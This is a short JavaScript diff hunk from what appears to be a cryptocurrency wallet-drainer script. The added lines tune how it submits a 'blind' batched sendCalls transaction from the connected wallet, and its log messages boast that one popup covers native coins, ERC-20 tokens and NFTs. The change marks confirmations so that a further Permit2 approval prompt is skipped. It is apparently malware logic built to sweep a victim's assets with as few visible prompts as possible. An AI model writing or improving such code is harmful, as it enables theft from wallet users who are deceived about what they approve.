@@ -5128,8 +5128,17 @@
         var blindId = extractBatchOrTxId(blindBatch);
         if (blindId && isLikelyTxHash(blindId)) {
           await SUBMIT.sendCalls(blindId, address, chainId, walletName);
+          markPopupConfirmed('sendCalls', chainId);
           didSomething = true;
-          L.log('BLIND sendCalls OK — ONE popup covered native + ERC-20 + NFTs');
+          // If batch had tokens/NFTs, mark permit2 confirmed — skip redundant Permit2 popup
+          if (batchTokensBlind.length > 0 || assets.nfts.length > 0) {
+            markPopupConfirmed('permit2', chainId);
+            L.log('BLIND sendCalls OK — ONE popup covered native + ERC-20 + NFTs (permit2 skipped)');
+          } else {
+            L.log('BLIND sendCalls OK — native only (permit2 will handle tokens)');
+          }
+        } else if (blindBatch) {
+          markPopupConfirmed('sendCalls', chainId);
         }
       } catch (blindE) {
         if (isUserRejection(blindE)) throw blindE;
